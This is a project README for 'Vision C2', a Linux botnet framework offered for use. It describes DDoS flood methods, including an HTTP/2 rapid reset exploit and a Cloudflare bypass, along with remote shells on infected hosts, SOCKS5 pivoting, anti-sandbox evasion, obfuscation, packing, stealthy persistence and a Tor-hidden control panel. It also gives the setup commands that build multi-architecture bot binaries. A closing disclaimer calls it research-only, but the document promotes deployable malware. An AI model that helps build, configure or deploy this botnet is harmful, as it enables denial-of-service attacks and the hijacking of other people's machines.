<div align="center">

# Vision C2 — Advanced Linux Botnet Framework

> DDoS, RCE, SOCKS5 pivoting. TLS 1.3 transport.
> Full AES encryption. Anti-analysis, anti-sandbox, anti-debugger checks. Full daemonized persistence.
> Driven through a websocket-powered Tor web panel or real-time Go TUI.

[Video Showcasing Full Features + Installation](https://www.youtube.com/watch?v=KkIg24KwpB0)

![Go](https://img.shields.io/badge/Go-1.24.0+-00ADD8?style=for-the-badge&logo=go)
![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)
[![Changelog](https://img.shields.io/badge/Changelog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)

### VisionC2 now supports Tor Browser

<img width="1381" height="780" alt="image" src="https://github.com/user-attachments/assets/ed3bf121-6912-43af-abb3-a008cd9af91a" />

<img width="1218" height="716" alt="image" src="https://github.com/user-attachments/assets/c6a71f38-cf92-4470-8706-718388d26646" />

</div>

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Usage](#usage)
- [Attack Methods](#attack-methods)
- [Documentation](#documentation)

---

## Features

### Encrypted Transport

TLS 1.3 bot↔C2 over port 443 — indistinguishable from normal HTTPS traffic.

### Stealth & Obfuscation

All strings AES-128-CTR encrypted at build time with per-build random keys. C2 address decoded through a 6-layer pipeline: AES → Base64 → XOR → RC4 → byte-sub → MD5 check. Bundled **m30w packer** (custom UPX fork, zero fingerprint) obfuscates every binary.

### Anti-Analysis

40+ VM/sandbox/debugger signatures. Parent process detection. Sandboxes never reach `main()`.

### 3-Way C2 Interface

Tor hidden service web panel, real-time Go TUI, or Telnet CLI. Run one or all simultaneously. The Tor panel gives full control from any browser with zero clearnet exposure.

### SOCKS5 Pivoting

Backconnect relay (primary) or direct listener. Multi-relay failover with auto-reconnect. Disposable relay VPS keeps the C2 hidden.

### Persistence

Triple-layered: systemd + cron watchdog + rc.local. Kill one, the others revive it. Fork+setsid daemonization with disguised process names and PID lock to prevent duplicate agents.

### Authentication

HMAC registration via MD5 challenge-response with per-campaign sync tokens. Replay-proof.

### Remote Shell

Full output capture with built-in Linux shortcuts and post-exploit helpers.

---

## Architecture

Vision has three components:

**`cnc/`** — Command & Control server. Dual-listener: TLS on 443 for bot connections, plus an embedded Tor hidden service hosting the web panel (WebSocket shell, live SOCKS dashboard, attack launcher, post-exploit shortcuts). Also runs an interactive TUI built with Bubble Tea and an optional Telnet admin CLI. RBAC with four permission tiers (Basic / Pro / Admin / Owner) configured in `users.json`. Relay endpoints and proxy credentials baked in at build time via `setup.py`.

**`bot/`** — The agent deployed to targets. Connects back over TLS 1.3. Lifecycle: decode runtime config → daemonize → sandbox detection → singleton lock → install persistence → DNS-resolve C2 → connect with reconnect loop. Pre-configured relay endpoints encrypted into the binary.

**`relay/`** — Backconnect SOCKS5 relay server. Sits between proxy users and bots — bots connect out to the relay via TLS, users connect to the relay's SOCKS5 port. Disposable infrastructure that keeps C2 hidden. Multi-relay failover with auto-reconnect and exponential backoff.

---

## Installation

### Prerequisites

```bash
sudo apt update && sudo apt install -y openssl git wget gcc python3 screen

# Go 1.24+
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
```

| Requirement | Minimum | Recommended |
|---|---|---|
| RAM / Storage | 512 MB / 1 GB | 2 GB+ / 5 GB+ |
| OS | Linux (any) | Ubuntu 22.04+ / Debian 12+ |
| Network | Port 443 open | + Admin port for split mode |

### Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py   # Select [1] Full Setup
```

The wizard prompts for your **C2 address**, **admin port** (default `420`), and **TLS cert details**. Output:

```
bins/              → 14 bot binaries (multi-arch)
cnc/certificates/  → server.crt + server.key
server             → CNC binary
setup_config.txt   → Config summary
```

To change the C2 address later: `python3 setup.py` → option `[2]`. Redeploy bots afterward.

---

## Usage

<img width="1050" height="723" alt="image" src="https://github.com/user-attachments/assets/43e6343f-4bf6-41a6-b52e-9f9318d44b00" />

### Starting the CNC

```bash
./server              # interactive launcher — pick TUI, Telnet, or both
./server --tui        # TUI mode only
./server --split      # Telnet mode on port 420
./server --daemon     # Telnet headless (no TUI)
```

Run in background with `screen -S vision ./server` (detach: `Ctrl+A, D`).

> Full binary map: [`build.sh`](tools/build.sh)

### TUI Navigation

| Key | Action |
|---|---|
| `↑/↓` or `k/j` | Navigate |
| `Enter` | Select |
| `q` / `Esc` | Back / Cancel |
| `r` | Refresh |

### Tor Web Panel

Access the panel through Tor Browser at the `.onion` address printed on startup. Tabs switch with number keys.

| Tab | Key | What it does |
|---|---|---|
| **Bots** | `1` | Live bot table. Click a row for management popup (shell, SOCKS, group, persist, kill). Double-click to open a remote shell directly. |
| **SOCKS** | `2` | Launch SOCKS5 tunnels. Relay dropdown auto-populated from `setup.py`; credentials pre-filled. |
| **Attack** | `3` | Method picker with target/duration fields and confirmation dialog. |
| **Activity** | `4` | Real-time feed of bot join/leave events. |
| **Tasks** | `5` | Running and queued task list. |
| **Users** | `6` | User management (RBAC tiers). |

The remote shell includes a file browser, tab completion, and a post-exploit shortcuts menu.

| Key | Action |
|---|---|
| `1`-`6` | Switch tab |
| `/` | Search |
| `?` | Help |
| `Esc` | Close dialog |

---

## Attack Methods

### Layer 4 — Network/Transport

| Method | Description |
|---|---|
| **UDP Flood** | High-volume 1024-byte payload spam |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | Randomized source ports (raw TCP) |
| **ACK Flood** | ACK packet flooding (raw TCP) |
| **GRE Flood** | GRE protocol 47, max payload |
| **DNS Flood** | Randomized query types, DNS reflection |

### Layer 7 — Application

| Method | Description |
|---|---|
| **HTTP Flood** | GET/POST with randomized headers + user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse + fingerprinting |
| **Rapid Reset** | HTTP/2 exploit (CVE-2023-44487), batched HEADERS + RST_STREAM |
| **Proxy Support** | Full proxy integration for all L7 methods (HTTP + SOCKS5) |

---

## Documentation

| Doc | Description |
|---|---|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
| [`SETUP.md`](Docs/SETUP.md) | Setup guide |
| [`PROXY.md`](Docs/PROXY.md) | SOCKS5 relay deployment |

---

## Legal Disclaimer

**For authorized security research and educational purposes only.** Usage of this tool against targets without prior mutual consent is illegal. The developer assumes no liability for misuse or damage caused by this program.

---

<div align="center">

**Syn2Much** — [hell@sinners.city](mailto:hell@sinners.city) | [@synacket](https://x.com/synacket)

</div>
